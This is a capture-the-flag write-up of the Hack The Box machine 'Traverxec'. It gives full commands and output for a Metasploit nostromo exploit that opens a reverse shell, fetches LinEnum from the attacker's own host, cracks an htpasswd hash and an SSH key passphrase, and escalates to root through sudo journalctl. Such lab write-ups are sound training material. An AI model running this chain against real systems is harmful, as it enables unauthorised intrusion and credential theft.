---
title: Hack The Box - Traverxec
date: 2020-04-12 02:48:00 +0800
categories: [hackthebox] 
tags: [redis, ssh, webmin, linux]
image:
    path: /assets/images/traverxec.png
---
This box was the last `Easy` box of the year 2019 and it has made me realise that I really have went a long way since the start of my journey in HackTheBox. 

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.165 traverxec.htb" >> /etc/hosts
```

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
```bash
$ nmap -sV -sT -sC traverxec.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-21 04:12 EST
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.82 seconds

```

# Enumeration (1)

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, maybe we can find some information on it ?

![](/assets/images/traverxec1.png)

Seems like an online portfolio? There aren't any pages to visit but there was a form which submits to a `empty.html`, which contained nothing useful.

Lets see if we can find any exploits using `searchsploit`.
```bash
$ searchsploit nostromo
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)      | exploits/multiple/remote/47573.rb
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution      | exploits/linux/remote/35466.sh
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

# Exploitation

Awesome, lets use the Metasploit exploit to get a shell.

```bash
$ msfconsole
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.XX.XX
LHOST => 10.10.XX.XX
msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS traverxec.htb
RHOSTS => traverxec.htb
msf5 exploit(multi/http/nostromo_code_exec) > set ForceExploit true
ForceExploit => true
msf5 exploit(multi/http/nostromo_code_exec) > run 

[*] Started reverse TCP handler on 10.10.XX.XX:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.XX.XX:4444 -> 10.10.10.165:37316) at 2019-12-21 04:21:24 -0500

```

There's no prompt but lets try to upgrade to a `tty` shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

# Enumeration (2)

Lets see if running [`LinEnum`](https://github.com/rebootuser/LinEnum) will give us any insights on how to carry on. I will be starting a web server on my machine using the builtin `SimpleHTTPServer` module in `python` and use `wget` to retrieve it.

```bash
$ mkdir httpserver
$ cd httpserver
$ cp ~/LinEnum.sh .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```bash
www-data@traverxec:/usr/bin$ cd /tmp
www-data@traverxec:/tmp$ wget http://10.10.XX.XX/LinEnum.sh
--2019-12-31 09:22:23--  http://10.10.XX.XX/LinEnum.sh
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 (45K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.39K  59.2KB/s    in 0.8s    

2019-12-31 09:22:24 (59.2 KB/s) - 'LinEnum.sh' saved [46476/46476]

www-data@traverxec:/tmp$ 
```

Running `LinEnum.sh` shows that there is a username and a password hash in a `.htaccess` file.

```bash
www-data@traverxec:/tmp$ ./LinEnum.sh
...
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
...
```

To crack it, I will be using `hashcat`.

```bash
$ hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt
...
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
Time.Started.....: Sat Dec 21 09:07:19 2019 (5 mins, 0 secs)
Time.Estimated...: Sat Dec 21 09:12:19 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    36494 H/s (6.67ms) @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10776576/14344385 (75.13%)
Rejected.........: 0/10776576 (0.00%)
Restore.Point....: 10774528/14344385 (75.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: OBADIAH -> Nov25th

Started: Sat Dec 21 09:07:16 2019
Stopped: Sat Dec 21 09:12:20 2019
```

`ssh`ing as `david` did not work with `david:Nowonly4me`, so lets try taking a look at his home directory.

```bash
www-data@traverxec:/usr/bin$ ls /home/david
ls: cannot open directory '/home/david': Permission denied
```

Kind of a deadend here so I scouted the forums for hints and many were saying to study the config of the `nostromo` service carefully.

`/var/nostromo/conf/nhttpd.conf`:
```
# MAIN [MANDATORY]                                                                                
                                                                                                  
servername              traverxec.htb                                                             
serverlisten            *                                                                         
serveradmin             david@traverxec.htb                                                       
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

If we look at the documentation for the `nostromo` service,
```
HOMEDIRS

To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:
http://www.nazgul.ch/~hacki/
...
```

Hmm... If we append `~` in front of `david` to the URL, we get `http://traverxec.htb/~david`.

![](/assets/images/traverxec2.png)

Nothing much here but we are getting somewhere. If we read more of the documentation,

```
HOMEDIRS
...
You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option
```

This means that the directory `public_www` must exist in the home directory of the users for this feature to work. Lets try browsing to `/home/david/public_www`.

```bash
www-data@traverxec:/home/david/public_www$ ls
ls
index.html  protected-file-area
```

What do we have here ? Inside the `protected-file-area`, we find a backup of `ssh` files.

```bash
www-data@traverxec:/home/david/public_www$ ls protected-file-area
backup-ssh-identity-files.tgz
```

Couldn't find any `curl` or `ftp` on the machine to upload the files to us, so lets see if we can access the folder via the browser at `http://traverxec.htb/~david/protected-file-area`.

![](/assets/images/traverxec3.png)

We get prompted for authentication, keyed in `david:Nowonly4me` and we can now proceed to download the file.

![](/assets/images/traverxec4.png)

To extract the contents, we run `tar` on it.

```bash
$ tar -xvf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

Lets see if we can `ssh` using the private `ssh` key.

```bash
$ ssh -i id_rsa david@traverxec.htb
Enter passphrase for key 'id_rsa':
```

Seems like we need a passphrase. Lets see if we can crack it with `john`. 

```bash
$ python ssh2john.py id_rsa > david.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt david.hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2019-12-21 22:53) 0.4132g/s 5926Kp/s 5926Kc/s 5926KC/sa6_123..*7¡Vamos!
Session completed

```

# user.txt

With the passphrase, lets try `ssh`ing as `david` and retrieve the user flag.

```bash
$ ssh -i id_rsa david@traverxec.htb
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Wed Jan  1 02:54:14 2020 from 10.10.XX.XX
david@traverxec:~$ cat user.txt
7db0XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

In `david`'s home directory , we see an interesting directory called `bin`.

```bash
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ ls bin
server-stats.head  server-stats.sh
```

server-stats.head contained an `ASCII` banner while server-stats.sh contained some commands.

```bash
david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

On the last line, we see a `sudo` command being ran.

Running the `sudo` command with the `journalctl` command simply prints some logs to the screen.

```bash
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:38:03 EST. --
Jan 01 02:50:20 traverxec nhttpd[458]: configuration has been reloaded
Jan 01 03:11:32 traverxec nhttpd[810]: stopped
Jan 01 03:13:22 traverxec nhttpd[458]: configuration has been reloaded
Jan 01 03:20:37 traverxec crontab[1414]: (www-data) LIST (www-data)
Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1
```

According to `journalctl`'s entry in  [`GTFOBins`](https://gtfobins.github.io/gtfobins/journalctl/), we see that we are able to break out by spawning a shell by entering `!/bin/sh`. But where can we enter the command ?

According to the `man` page of `journalctl`, the output is piped to `less`!

```
...
The output is paged through less by default, and long lines are "truncated" to screen
width. The hidden part can be viewed by using the left-arrow and right-arrow keys.
Paging can be disabled; see the --no-pager option and the "Environment" section below.
...
```

`less` will only work as intended if the output is more than the capacity of the terminal screen, hence if we shrink the width of it and run the command again,

```
- Logs begin at Wed 2020-01-01 02:24:45 EST, end at Wed 2020-01-01 03:45:55 EST. --
Jan 01 03:22:18 traverxec sudo[1420]: www-data : unknown user: #-1
Jan 01 03:44:32 traverxec su[1670]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost=  user=davi
Jan 01 03:44:34 traverxec su[1670]: FAILED SU (to david) www-data on pts/9
Jan 01 03:45:04 traverxec su[1674]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/9 ruser=www-data rhost=  user=davi
Jan 01 03:45:05 traverxec su[1674]: FAILED SU (to david) www-data on pts/9
lines 1-6/6 (END)
```

# root.txt

We get a somewhat incomplete output and by entering `!/bin/sh`, we get a shell as `root`!

```bash
!/bin/sh
# whoami
root
# cat /root/root.txt
9aa3XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


### Rooted ! Thank you for reading and look forward for more writeups and articles !
